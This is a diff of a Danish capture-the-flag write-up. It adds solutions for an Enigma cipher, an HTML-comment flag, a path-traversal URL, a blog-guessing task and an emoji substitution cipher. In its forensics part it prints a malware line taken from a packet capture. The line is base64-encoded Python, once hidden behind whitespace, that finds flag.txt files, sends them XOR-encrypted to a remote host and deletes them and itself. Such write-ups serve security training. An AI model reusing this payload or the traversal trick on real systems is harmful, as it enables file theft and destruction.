@@ -17,24 +17,109 @@ Challenge beskrivelse:
 Du har netop modtaget en kritisk krypteret besked fra en vintage Enigma-maskine - en relikvie fra Anden Verdenskrigs kryptografi, der engang beskyttede de mest følsomme meddelelser fra aksemagterne. Efterretninger tyder på, at denne besked indeholder navnet på en strategisk lokation, der er afgørende for en igangværende kontraspionageoperation.
 
 Din mission: Bryd gennem Enigmas legendariske kryptering og afslør det skjulte bynavn.
+Vedhæftet var en zip-fil med et python script og en txt fil.
+Det givne python script: 
+```python
+#!/usr/bin/env python
+# Install the engima machine python package!
+# pip install py-enigma
+from enigma.machine import EnigmaMachine
 
+machine = EnigmaMachine.from_key_sheet(
+    rotors='II III I', 
+    reflector='B',      
+    ring_settings='1 1 1',  
+    plugboard_settings='AV BS CG DL FU HZ IN KM OW RX'  
+)
+
+# Message to be decrypted
+plaintext = "" # Input here the flag
+bracket_1 = "{"
+bracket_2 = "}"
+
+ciphertext = machine.process_text(plaintext)
+print(f'Decrypted Flag: DDC{bracket_1}{ciphertext}_0{bracket_2}')
+```
+og tekstfilen: 
+```
+THE ENCRYPTED FLAG IS ONE OF THE FOLLOWING:
+BSGRJNDS
+ZQKRQTZWEFH
+UJHOB
+```
+Der er altså allerede lavet en "decrypt" funktion. Jeg prøvede blot de 3 givne flag, og fik "UJHOB" til at give flaget: DDC{PARIS_0}
 
 ### ExploreCPH
 Challenge beskrivelse: En klog hacker har indlejret deres signatur på en rejsebureau-hjemmeside i København. 
 Du skal finde denne signatur og opdage hackerens navn. Hints: Signaturen er i kildekoden
 
+Vedhæftet var en zip-fil med en .html, hvor der i bunden af kildekoden var en kommentar der gav flaget: DDC{J0hnD03}
+
 ### Bobbys tabte flag
 Drillenissen har gemt lille Bobby’s flag væk i en eller anden mappe, kan du hjælpe Bobby med at finde det igen?
 http://drillenissen.fire
+
+Når man først tilgår siden bliver man mødt med dette: 
+
+![Alt Text]({{ '/assets/img/bobby1.png' | absolute_url }})
+
+Jeg prøvede dernæst at trykke på dansk noter: 
+
+![Alt Text]({{ '/assets/img/bobby2_5.png' | absolute_url }})
+
+Dernæst prøvede jeg /privat
+
+![Alt Text]({{ '/assets/img/bobby2.png' | absolute_url }})
+
+Og til sidst prøvede jeg url'en http://drillenissen.fire/../hoejt_skab/flag.html som viste dette: 
+![Alt Text]({{ '/assets/img/bobby3.png' | absolute_url }})
+
+Jeg fandt flaget: DDC{Du_F4ndt_80bby_s_Fl4g}
+
 
 ### Flashback Maskinen
 Kan du finde bloggen og finde ud af hvad Thea lavede i Alanya?
 http://flashbackmaskinen.hkn
 
+Når man først tilgår siden bliver man mødt med dette: 
+![Alt Text]({{ '/assets/img/flashback_maskinen.png' | absolute_url }})
+
+Jeg brugte overraskende lang tid på at gætte diverse blog navne, da jeg til sidst bare prøvede den givne i eksemplet: StilOgSmag.hkn, som viste sig at være bloggen. 
+Der var et par blog posts om Alanya, dog fandt jeg et der viste denne Gucci taske: 
+
+![Alt Text]({{ '/assets/img/flashback_maskinen_2.png' | absolute_url }})
+
+Dertil fandt jeg flaget: DDC{M3get_43gt3_Fucci}
+
+
 ### #FAKENEWS
 Vi er faldet over en X tråd mellem Musk og Trump, hvor vi mistænker Trump for at dele information, men hvad er det for en hemmelighed Trump deler?
 
 ![Alt Text]({{ '/assets/img/fakenews.jpg' | absolute_url }})
+
+Substitutionsciffer opgaver er altid irriterende. Jeg prøvede først at få AI til at omskrive emojis fra billedet, dog var det så sløret at jeg måtte opgive. 
+Jeg brugte dernæst mine Paint evner til langsomt at dekode emojis. Jeg startede med navnene, som gav de mest brugte vokaler, og arbejdede mig dernæst bare metodisk igennem.
+Det tog lidt tid men jeg endte med at gennemskue at flaget indeholdt leet kode, og derfor manglede jeg noget. 
+
+![Alt Text]({{ '/assets/img/substitution.jpg' | absolute_url }})
+
+Dette endte med at give følgende samtale: 
+Elon musk:
+Donald jeg ved du har adgang til mange hemmeligheder noget sjovt du kan dele?
+
+Donald Trump:
+Elon du ville ikke tro halvdelen af det jeg ved nogle ting er meget hemmelige 
+
+Elon musk:
+kom nu, bare en ting. Noget kryptisk noget kan de klogeste kan forstå
+
+okay  her er noget for dem, der virkelig tænker:
+ddc{musk_f0r_pr3s1d3n7}
+
+interessant mon nogen kan finde ud af, hvad det betyder? x c t f   x h a c k t h e p l a n e t
+
+Samt flaget: DDC{musk_f0r_pr3s1d3n7}
+
 ## Cryptography
 
 ## Forensics 
@@ -72,7 +157,7 @@ I suspect it was malicious. Can you help me find out what it did?
 
 Dertil var der givet en zip-fil med en .pcap fil. Jeg åbnede denne i Wireshark og søgte på teksten "nitro" i netværkspakkedetaljerne og fandt dette i en af HTTP pakkerne:
 ```python
-import time, sys                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         , base64, threading;threading.Thread(target=lambda x: exec(base64.b64decode("aW1wb3J0IG9zCgpkZWYgc3RlYWwocGF0aCk6CiBpbXBvcnQgc29ja2V0CiBkZWYgeG9yKGRhdGEsIGtleSk6CiAgcmV0dXJuIGJ5dGVzKFthIF4gYiBmb3IgYSwgYiBpbiB6aXAoZGF0YSwga2V5ICogKGxlbihkYXRhKSAvLyBsZW4oa2V5KSArIDEpKV0pCiB3aXRoIG9wZW4ocGF0aCwgInJiIikgYXMgZjoKICBjb250ZW50ID0gZi5yZWFkKCkKIGVuY3J5cHRlZCA9IHhvcihjb250ZW50LCBiIjZhNTI2NWUyNjBmN2JlZDUwMDY5M2IwZDIxYTA1Y2QyIikKIHMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCiBzLmNvbm5lY3QoKCJuaXRyby1nZW5lcmF0b3IuaGtuIiwgNTkwMDApKQogcy5zZW5kYWxsKGVuY3J5cHRlZCkKIHMuY2xvc2UoKQogb3MucmVtb3ZlKHBhdGgpCgpmb3Igcm9vdCwgZGlycywgZmlsZXMgaW4gb3Mud2FsaygiLyIpOgogZm9yIGZpbGUgaW4gZmlsZXM6CiAgcGF0aCA9IG9zLnBhdGguam9pbihyb290LCBmaWxlKQogIGlmIG9zLnBhdGguaXNmaWxlKHBhdGgpIGFuZCBmaWxlID09ICJmbGFnLnR4dCI6CiAgIHRyeTpzdGVhbChwYXRoKQogICBleGNlcHQ6cGFzcwoKcHJpbnQoIlxuRmFpbGVkIHRvIGdlbmVyYXRlIG5pdHJvIGNvZGVzLiIpCm9zLnJlbW92ZShfX2ZpbGVfXykKb3MuX2V4aXQoKSBpZiBvcy5uYW1lID09ICJudCIgZWxzZSBvcy5raWxsKG9zLmdldHBpZCgpLCA5KQ==")), args=(0,)).start()
+import time, sys, base64, threading;threading.Thread(target=lambda x: exec(base64.b64decode("aW1wb3J0IG9zCgpkZWYgc3RlYWwocGF0aCk6CiBpbXBvcnQgc29ja2V0CiBkZWYgeG9yKGRhdGEsIGtleSk6CiAgcmV0dXJuIGJ5dGVzKFthIF4gYiBmb3IgYSwgYiBpbiB6aXAoZGF0YSwga2V5ICogKGxlbihkYXRhKSAvLyBsZW4oa2V5KSArIDEpKV0pCiB3aXRoIG9wZW4ocGF0aCwgInJiIikgYXMgZjoKICBjb250ZW50ID0gZi5yZWFkKCkKIGVuY3J5cHRlZCA9IHhvcihjb250ZW50LCBiIjZhNTI2NWUyNjBmN2JlZDUwMDY5M2IwZDIxYTA1Y2QyIikKIHMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCiBzLmNvbm5lY3QoKCJuaXRyby1nZW5lcmF0b3IuaGtuIiwgNTkwMDApKQogcy5zZW5kYWxsKGVuY3J5cHRlZCkKIHMuY2xvc2UoKQogb3MucmVtb3ZlKHBhdGgpCgpmb3Igcm9vdCwgZGlycywgZmlsZXMgaW4gb3Mud2FsaygiLyIpOgogZm9yIGZpbGUgaW4gZmlsZXM6CiAgcGF0aCA9IG9zLnBhdGguam9pbihyb290LCBmaWxlKQogIGlmIG9zLnBhdGguaXNmaWxlKHBhdGgpIGFuZCBmaWxlID09ICJmbGFnLnR4dCI6CiAgIHRyeTpzdGVhbChwYXRoKQogICBleGNlcHQ6cGFzcwoKcHJpbnQoIlxuRmFpbGVkIHRvIGdlbmVyYXRlIG5pdHJvIGNvZGVzLiIpCm9zLnJlbW92ZShfX2ZpbGVfXykKb3MuX2V4aXQoKSBpZiBvcy5uYW1lID09ICJudCIgZWxzZSBvcy5raWxsKG9zLmdldHBpZCgpLCA5KQ==")), args=(0,)).start()
 
 
 chars = "\\|/-"
